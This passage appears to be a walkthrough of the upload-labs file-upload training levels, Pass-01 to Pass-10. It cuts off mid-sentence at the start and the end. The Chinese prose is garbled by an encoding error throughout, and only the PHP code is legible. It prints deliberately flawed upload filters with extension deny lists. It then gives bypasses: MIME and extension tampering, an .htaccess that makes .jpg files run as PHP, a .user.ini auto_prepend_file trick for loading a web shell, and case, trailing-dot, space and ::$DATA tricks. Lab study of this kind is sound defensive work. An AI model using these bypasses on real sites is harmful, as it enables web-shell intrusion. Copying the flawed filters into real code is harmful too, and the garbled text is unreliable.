\"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name; alert(errMsg); return false; } } å¯ä»¥çœ‹åˆ°ï¼Œå…³é”®çš„fileå‚æ•°æ˜¯ä»å‰ç«¯æå–åˆ°çš„ï¼Œå¦‚æœfileä¸ºæŒ‡å®šçš„ä¸Šè¿°ä¸‰ç§ç±»å‹ï¼Œåˆ™å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œå¦‚æœä¸æ˜¯æŒ‡å®šç±»å‹ï¼Œåˆ™ä¼šæœ‰ä¸ªå¼¹çª—ã€‚ æ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åœ¨å‰ç«¯è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬èƒ½ç»•è¿‡å‰ç«¯æ£€éªŒç›´æ¥è¿›è¡Œåç«¯ï¼Œå°±å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶äº†ã€‚å› ä¸ºåç«¯å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ã€‚ è¿™é‡Œç»•è¿‡æ–¹å¼å¯ä»¥æ˜¯ï¼šå‰ç«¯ç¦ç”¨jsï¼Œæˆ–è€…bpæŠ“åŒ…è¿›å…¥åç«¯ã€‚ å‰ç«¯ç¦ç”¨js è¿™é‡Œç”¨F12ç¦ç”¨jsï¼Œä¸Šä¼ å³å¯ éªŒè¯æˆåŠŸ bpæŠ“åŒ… é¦–å…ˆä¸Šä¼ ä¸€ä¸ªåç¼€æ­£ç¡®çš„æ–‡ä»¶ï¼Œä¹‹åbpæŠ“åŒ…éšåä¿®æ”¹åç¼€ä¸ºphpï¼Œå¦‚ä¸‹å›¾ä¸Šä¼ æˆåŠŸ Pass-02 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } è¿™é‡Œçœ‹åˆ°ä»£ç å¯¹æ–‡ä»¶typeåšå‡ºäº†é™åˆ¶ï¼Œæˆ‘ä»¬ç™¾åº¦å¾ˆå®¹æ˜“æœåˆ°è¿™æ ·çš„ä¿¡æ¯ï¼š $_FILES[myFile][name] æ˜¾ç¤ºå®¢æˆ·ç«¯æ–‡ä»¶çš„åŸåç§°ã€‚ $_FILES[myFile][type] æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œä¾‹å¦‚image/gifã€‚ $_FILES[myFile][size] å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚ $_FILES[myFile][tmp_name] å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤ã€‚ $_FILES[myFile][error] è¯¥æ–‡ä»¶ä¸Šä¼ çš„ä»£ç ï¼ŒPHP4.2ç‰ˆæœ¬åå¢åŠ çš„ å› æ­¤æˆ‘ä»¬bpä¿®æ”¹MIMEç±»å‹å³å¯ç»•è¿‡ Pass-03 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } è¿™é‡Œå¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€è¿›è¡Œäº†é»‘åå•çš„è¿‡æ»¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›ç•¸å½¢ï¼ˆä¸å¸¸è§çš„ï¼‰åç¼€åè¿›è¡Œç»•è¿‡ å¦‚ php1ã€php2ã€php3ã€php4ã€php5ã€php7ã€phtã€phtmlã€ pharã€ phpsã€Aspã€aspxã€cerã€cdxã€ asaã€asaxã€jspã€jspaã€jspxç­‰ç•¸å½¢åç¼€åã€‚ å‰ææ¡ä»¶ï¼šå³Apacheçš„httpd.confæœ‰é…ç½®ä»£ç  AddType application/x-httpd-php .pht .phtml .phps .php5 .pht . æˆ‘ä»¬å¯ä»¥è¿›å…¥é…ç½®æ–‡ä»¶æŸ¥çœ‹ä¸€ä¸‹ï¼š é‚£è¿™é‡Œç›´æ¥ä¸Šä¼ è¿™é‡Œå‰©ä¸‹çš„ä¸‰ä¸ªåç¼€å³å¯ç»•è¿‡ æˆåŠŸä¸Šä¼  Pass-04 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } è¿™é‡Œå¯ä»¥çœ‹åˆ°é»‘åå•è¿‡æ»¤çš„æ›´å¤šäº†ï¼Œèƒ½è¿‡æ»¤çš„å‡ ä¹éƒ½è¿‡æ»¤äº†ï¼Œä½†å´æ²¡æœ‰è¿‡æ»¤.htaccessä¸.user.iniåç¼€ è€Œè¿™é‡Œç”¨åˆ°çš„æ˜¯.htaccessï¼š htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚ å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚ å®ƒé‡Œé¢æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼šAllowOverride Noneï¼Œæˆ‘ä»¬æŠŠNoneæ”¹æˆAll .htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚ é¦–å…ˆå†™ä¸€ä¸ª.htaccessï¼Œå†…å®¹å¦‚ä¸‹ï¼Œä»–ä¼šå°†åç¼€åä¸ºjpgçš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æï¼Œäºæ˜¯æˆ‘ä»¬å°†æœ¨é©¬æ–‡ä»¶åç¼€åæ”¹ä¸ºjpgå³å¯ &lt;FilesMatch \"jpg\"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; æˆ– AddType application/x-httpd-php .jpg ä¸Šä¼ æˆåŠŸ Pass-05 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†.htaccessï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨.user.iniåç¼€ï¼š php.ini æ˜¯ phpçš„é…ç½®æ–‡ä»¶ï¼Œ.user.ini ä¸­çš„å­—æ®µä¹Ÿä¼šè¢« php è§†ä¸ºé…ç½®æ–‡ä»¶æ¥å¤„ç†ï¼Œä»è€Œå¯¼è‡´ php çš„æ–‡ä»¶è§£ææ¼æ´ã€‚ä½†æ˜¯æƒ³è¦å¼•å‘ .user.ini è§£ææ¼æ´éœ€è¦ä¸‰ä¸ªå‰ææ¡ä»¶ æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP å·²æ»¡è¶³ æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼ ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶ å·²æ»¡è¶³ é¦–å…ˆè°ƒæ•´ä¸º FastCGI æ¨¡å¼ï¼ˆåˆ‡æ¢ç‰ˆæœ¬ä¸­åˆ‡æ¢åˆ°5.3.29-nts+Nginxï¼‰ åˆ›å»ºä¸€ä¸ª.user.iniæ–‡ä»¶ auto_prepend_file=1.jpg .user.iniæ–‡ä»¶é‡Œçš„æ„æ€æ˜¯ï¼šæ‰€æœ‰çš„phpæ–‡ä»¶éƒ½è‡ªåŠ¨åŒ…å«1.jpgæ–‡ä»¶ã€‚.user.iniç›¸å½“äºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„php.ini é¦–å…ˆä¸Šä¼ .user.ini auto_prepend_file=1.jpg .user.iniæ–‡ä»¶é‡Œçš„æ„æ€æ˜¯ï¼šæ‰€æœ‰çš„phpæ–‡ä»¶éƒ½è‡ªåŠ¨åŒ…å«1.jpgæ–‡ä»¶ã€‚.user.iniç›¸å½“äºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„php.ini é¦–å…ˆä¸Šä¼ .user.iniï¼Œåœ¨ä¸Šä¼ 1.jpgä¼šå‘ç°è§£æå›¾ç‰‡é”™è¯¯ï¼Œæ˜¯å› ä¸ºåªæœ‰åœ¨è®¿é—® php æ–‡ä»¶æ—¶ï¼Œæ‰ä¼šè‡ªåŠ¨åŒ…å« shell.jpg ï¼Œæ‰€ä»¥ä½œè€…ç»™äº†æç¤ºåœ¨ä¸Šä¼ ç›®å½•ä¸‹æ˜¯æœ‰ä¸€ä¸ª readme.php æ–‡ä»¶çš„ï¼Œæ‰€ä»¥ç›´æ¥è®¿é—®æ­¤æ–‡ä»¶å°±å¯ä»¥åŒ…å«ä¸Šä¼ çš„ shell äº† å› ä¸ºphpä¼šè‡ªåŠ¨åŒ…å«1.jpgï¼Œé‚£ä¹ˆæ–‡ä»¶é‡Œé¢çš„å†…å®¹å°±ä¼šè¢«å½“åšphpä»£ç è€Œæ‰§è¡Œã€‚æˆ‘ä»¬åªéœ€è¦åœ¨åŒ…å«çš„æ–‡ä»¶å†™ä¸Šä¸€å¥è¯æœ¨é©¬å³å¯ æ¥ä¸‹æ¥å¦‚æœç›´æ¥ä¸Šä¼ shell.bcxä¹‹åï¼Œå¦‚æœä½ æƒ³ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶ä¼šæŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸ºåªæœ‰åœ¨è®¿é—®PHPæ–‡ä»¶çš„æ—¶å€™ï¼Œæ‰ä¼šè‡ªåŠ¨åŒ…å«shell.bcxï¼Œæ ¹æ®æç¤ºï¼Œæˆ‘ä»¬çŸ¥é“ä¸Šä¼ ç›®å½•ä¸‹å­˜åœ¨redeme.phpæ–‡ä»¶ ä¸Šä¼ æœ¨é©¬åï¼Œæˆ‘ä»¬è¿›å…¥ä¸Šä¼ ç›®å½•è®¿é—®redeme.phpæ–‡ä»¶å³å¯ ä¸Šä¼ æˆåŠŸ Pass-06 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } è¿™é‡Œçœ‹åˆ°åˆè¿‡æ»¤äº†.iniåç¼€ï¼Œä½†è¿™é‡Œå´å¿˜è®°è¿‡æ»¤å¤§å°å†™äº†ï¼Œä¿®æ”¹åç¼€åä¸ºPhpå³å¯ Pass-07 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } ä¸ä¸Šä¸€å…³å¯¹æ¯”å‘ç°ï¼Œæ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ï¼Œæˆ‘ä»¬åœ¨phpåç¼€æ·»åŠ ç©ºæ ¼å³å¯ç»•è¿‡ Pass-08 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } å¯¹æ¯”å‘ç°è¿™é‡Œæ²¡æœ‰åˆ é™¤æ–‡ä»¶æœ«å°¾çš„ç‚¹ï¼Œæˆ‘ä»¬åœ¨phpåé¢æ·»åŠ .å³å¯ Pass-09 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } å¯¹æ¯”å‘ç°ï¼Œè¿™ä¸€å…³æ²¡æœ‰è¿‡æ»¤::$DATAï¼Œå…·ä½“çš„å«ä¹‰å¯ä»¥å‚è€ƒï¼š::$DATAåœ¨æ–‡ä»¶è§£ææ¼æ´ä¸­çš„å¦™ç”¨ ::$DATAå±æ€§å¯ä»¥è¢«æ¶æ„æ”»å‡»è€…åˆ©ç”¨æ¥éšè—æ¶æ„ä»£ç æˆ–æ•°æ®ã€‚è¿™ç§æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºæˆ–æ“ä½œç³»ç»Ÿå¯¹æ–‡ä»¶è§£æå’Œå¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„æ–‡ä»¶åæˆ–è·¯å¾„ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºåœ¨è§£ææ–‡ä»¶æ—¶é”™è¯¯åœ°å°†::$DATAå±æ€§ä½œä¸ºæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œå¯¼è‡´æ¶æ„ä»£ç æˆ–æ•°æ®è¢«æ‰§è¡Œæˆ–è¯»å–ã€‚ åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+â€œ::$DATA\"ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATA\"ä¹‹å‰çš„æ–‡ä»¶åã€‚åˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€ ::$DATAâ€ç»•è¿‡ï¼š è¿™é‡Œæˆ‘ä»¬åœ¨ä¸Šä¼ æ–‡ä»¶åç¼€æ·»åŠ ::$DATAå³å¯ï¼Œä¸Šä¼ ä¹‹åï¼Œè®¿é—®å³å¯ tipsï¼š ::$DATAå±æ€§å¯¹äºæ™®é€šç”¨æˆ·æ¥è¯´æ˜¯éšè—çš„ é€šå¸¸åªæœ‰ç³»ç»Ÿå’Œä¸€äº›ç‰¹å®šçš„ç¨‹åºæ‰èƒ½è®¿é—®å’Œä½¿ç”¨å®ƒ å¯¹äºæ™®é€šç”¨æˆ·æ¥è¯´ æ–‡ä»¶çš„æ•°æ®æ˜¯é€šè¿‡æ–‡ä»¶åæ¥è®¿é—®å’Œæ“ä½œçš„ è€Œä¸éœ€è¦ç›´æ¥è®¿é—®::$DATAå±æ€§ Pass-10 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } è¿™ä¸€å…³æ¶‰åŠåˆ°äº†deldotå‡½æ•°ç‰¹æ€§ï¼š 